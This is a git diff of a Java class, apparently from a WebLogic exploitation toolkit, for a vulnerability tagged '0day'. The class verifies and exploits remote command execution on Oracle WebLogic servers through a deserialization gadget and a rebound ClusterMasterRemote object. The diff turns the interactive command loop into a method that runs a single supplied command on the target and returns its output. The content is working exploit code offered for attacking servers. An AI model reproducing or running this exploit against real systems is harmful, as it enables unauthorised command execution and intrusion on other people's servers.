@@ -4,6 +4,7 @@ import com.r4v3zn.weblogic.tools.annotation.Authors;
 import com.r4v3zn.weblogic.tools.annotation.Dependencies;
 import com.r4v3zn.weblogic.tools.annotation.Tags;
 import com.r4v3zn.weblogic.tools.annotation.Versions;
+import com.r4v3zn.weblogic.tools.entity.ContextPojo;
 import com.r4v3zn.weblogic.tools.entity.MyException;
 import com.r4v3zn.weblogic.tools.gadget.ObjectPayload;
 import com.r4v3zn.weblogic.tools.gadget.impl.LimitFilterGadget;
@@ -42,18 +43,6 @@ import static org.apache.commons.lang3.StringUtils.isBlank;
 @Tags({"0day"})
 public class S1274489 implements VulTest {
 
-    @Data
-    public class ContextPojo{
-        /**
-         * context
-         */
-        private Context context;
-
-        /**
-         * url class loader
-         */
-        private URLClassLoader urlClassLoader;
-    }
     /**
      * 漏洞利用 jar 文件名称
      */
@@ -83,6 +72,9 @@ public class S1274489 implements VulTest {
 
     private ClusterMasterRemote remote = null;
 
+    private String bindName = "";
+
+
     /**
      * 漏洞验证,漏洞存在返回 true 否则返回 false
      * @param ip ip
@@ -93,7 +85,7 @@ public class S1274489 implements VulTest {
      */
     @Override
     public Boolean vulnerable(String ip, Integer port, String... param) throws Exception {
-        String bindName = getRandomString(16);
+        this.bindName = getRandomString(16);
         ContextPojo contextPojo = rebindAny(ip,port,bindName,param);
         if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
             return false;
@@ -174,27 +166,24 @@ public class S1274489 implements VulTest {
      * @throws Exception 抛出异常
      */
     @Override
-    public void exploit(String ip, Integer port, String... param) throws Exception {
-        Boolean flag = vulnerable(ip,port,param);
-        if(!flag){
-            return;
-        }
+    public String exploit(String ip, Integer port, String... param) throws Exception {
+//        Boolean flag = vulnerable(ip,port,param);
+//        if(!flag){
+//            throw new MyException("漏洞不存在");
+//        }
         if(remote == null){
-            return;
+            throw new MyException("漏洞不存在");
         }
-        while (true){
-            String currentOs = System.getProperty("os.name");
-            System.out.print("[*] please input cmd : ");
-            Scanner scanner = new Scanner(System.in);
-            if(scanner.hasNext()){
-                String cmd = scanner.nextLine();
-                if ("exit".equals(cmd)){
-                    break;
-                }
-                cmd += "@@"+currentOs;
-                System.out.println(remote.getServerLocation(cmd));
-            }
+        if(param.length == 0){
+            throw new MyException("请输入执行命令");
         }
+        String currentOs = System.getProperty("os.name");
+        String cmd = param[0];
+        if(isBlank(cmd)){
+            throw new MyException("请输入执行命令");
+        }
+        cmd += "@@"+currentOs;
+        return remote.getServerLocation(cmd);
     }
 
     /**
